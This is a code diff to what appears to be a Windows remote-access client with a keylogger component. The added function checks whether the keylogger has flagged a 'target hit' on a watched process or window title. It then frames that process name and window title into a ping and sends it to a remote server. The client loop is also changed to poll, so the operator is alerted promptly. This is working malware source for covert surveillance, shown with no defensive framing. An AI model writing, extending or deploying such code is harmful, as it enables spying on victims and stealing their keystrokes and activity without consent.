@@ -494,6 +494,49 @@ static DWORD get_retry_delay_ms(void) {
     return (g_ping_interval_ms > 0) ? g_ping_interval_ms : 5000;
 }
 
+static void send_target_hit_ping_if_pending(remote_transport_handle_t transport, const char* uuid) {
+    if (!transport || !uuid || uuid[0] == '\0') return;
+    if (!remote_keylogger_is_target_hit_pending()) return;
+
+    unsigned char ping_body[256];
+    unsigned char frame_buf[320];
+    char hit_proc[256] = { 0 };
+    char hit_title[512] = { 0 };
+    int target_hit = remote_keylogger_consume_target_hit(hit_proc, sizeof(hit_proc), hit_title, sizeof(hit_title));
+    if (!target_hit) return;
+
+    unsigned int ping_body_len = remote_proto_encode_client_ping_request(
+        uuid,
+        1,
+        hit_proc,
+        hit_title,
+        ping_body,
+        sizeof(ping_body));
+    if (ping_body_len == 0) {
+        remote_log("[target-hit] encode ping request failed");
+        return;
+    }
+
+    unsigned int payload_len = remote_proto_prepend_imessage(
+        frame_buf + 4, sizeof(frame_buf) - 4,
+        REMOTE_SUBTYPE_ClientPingRequest, ping_body, ping_body_len);
+    if (payload_len == 0) {
+        remote_log("[target-hit] prepend IMessage failed");
+        return;
+    }
+
+    unsigned int frame_len = remote_proto_write_frame(frame_buf + 4, payload_len, frame_buf, sizeof(frame_buf));
+    if (frame_len == 0) {
+        remote_log("[target-hit] write frame failed");
+        return;
+    }
+
+    if (!send_frame_locked(transport, frame_buf, frame_len))
+        remote_log("[target-hit] send failed");
+    else
+        remote_log("[target-hit] notification sent (proc='%s', title='%s')", hit_proc, hit_title);
+}
+
 /* Sleep but wake early when keylogger has a pending "target hit" to prompt operator. */
 static void sleep_retry_or_target_hit(DWORD delay_ms) {
     const DWORD step_ms = 250;
@@ -966,9 +1009,21 @@ void remote_client_run(void) {
             if (!g_send_mutex) g_send_mutex = CreateMutexA(NULL, FALSE, NULL);
             while (InterlockedCompareExchange(&g_client_stop, 1, 1) != 1) {
                 g_file_transport = transport;
+                send_target_hit_ping_if_pending(transport, id_buf);
                 if (InterlockedCompareExchange(&g_request_reconnect, 1, 1) == 1) {
                     remote_log("[loop] reconnect requested; breaking to reconnect");
                     break;
+                }
+                {
+                    int pr = remote_transport_poll_read(transport, 250);
+                    if (pr == 0) {
+                        /* No incoming server frame yet; loop to allow target-hit send checks. */
+                        continue;
+                    }
+                    if (pr < 0) {
+                        remote_log("[loop] poll read failed; disconnecting");
+                        break;
+                    }
                 }
                 if (!remote_transport_recv(transport, header, 4)) {
                     remote_log("[loop] recv header failed; disconnecting");
